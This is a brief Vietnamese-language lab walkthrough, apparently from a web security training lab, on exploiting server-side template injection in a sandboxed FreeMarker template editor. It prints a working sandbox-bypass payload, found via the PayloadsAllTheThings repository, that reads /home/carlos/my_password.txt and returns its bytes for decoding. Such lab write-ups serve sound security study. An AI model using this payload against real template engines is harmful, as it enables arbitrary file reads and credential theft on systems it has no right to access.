## Server-side template injection in a sandboxed environment.

1. Sau khi đăng nhập, sử dụng tính năng eidt template. Nhận thấy template freemaker gọi đến product object. 

![Img1](\asset/../img/identify_template.png)

2. Search được trên github có repo PayloadAllTheThing có chứa payload bypass sandbox environment cho freemaker

![Img2](\asset/../img/search.png)

3. Craft payload để thực hiện mục đích
- Payload: ``${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}``

![Img3](\asset/../img/successful.png)

4. Convert chuỗi dec sang ascii 

![Img4](\asset/../img/convert.png)